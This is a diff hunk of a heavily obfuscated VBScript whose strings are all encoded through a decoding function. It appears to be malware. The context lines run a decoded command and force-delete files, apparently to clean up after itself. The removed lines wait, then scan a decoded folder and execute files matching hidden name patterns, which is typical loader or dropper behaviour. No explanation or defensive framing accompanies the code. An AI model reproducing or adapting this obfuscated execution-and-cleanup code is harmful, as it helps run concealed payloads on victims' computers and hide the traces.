@@ -121,16 +121,6 @@ If iHqs5U3.FileExists(o8sDhg0bM) Then
     m8HW1e91.Run ui6laMI("#UdmG_VdFh/WVhx#""nL,E*L#_,|&e(0$c[bn>[BL")
 end if
 
-wscript.sleep 5000
-m8HW1e91.CurrentDirectory = ui6laMI("V7:9|0ZRrK@i1[%h^irR*y") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
-For Each of28Yc7r in zG1IH7kt.GetFolder(ui6laMI("F$Q9X0dRRK}iZ[\h&ieRVI") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")).Files
-if InStr(of28Yc7r,ui6laMI("'&,M<_CdBhxW&hi9")) > 0 then
-    if InStr(of28Yc7r,ui6laMI("O0`l""X-i:R")) > 0 then
-        m8HW1e91.Run of28Yc7r.name
-    end if
-end if
-Next
-
 Set kj7PrWB8X9 = CreateObject(ui6laMI("0O&IGY1h^_=fhj1_fd""]#$I<(_|bJ[UIpoQiTj6[(c>EwX%`%[CY+j`n"))
 kj7PrWB8X9.DeleteFile(ui6laMI("'\?9&0[R""K<i'[%h^iyRai") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + gXVv5P43wz ), DeleteReadOnly
 kj7PrWB8X9.DeleteFile(ui6laMI("'\?9&0[R""K<i'[%h^iyRai") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + qf1vTN121 ), DeleteReadOnly
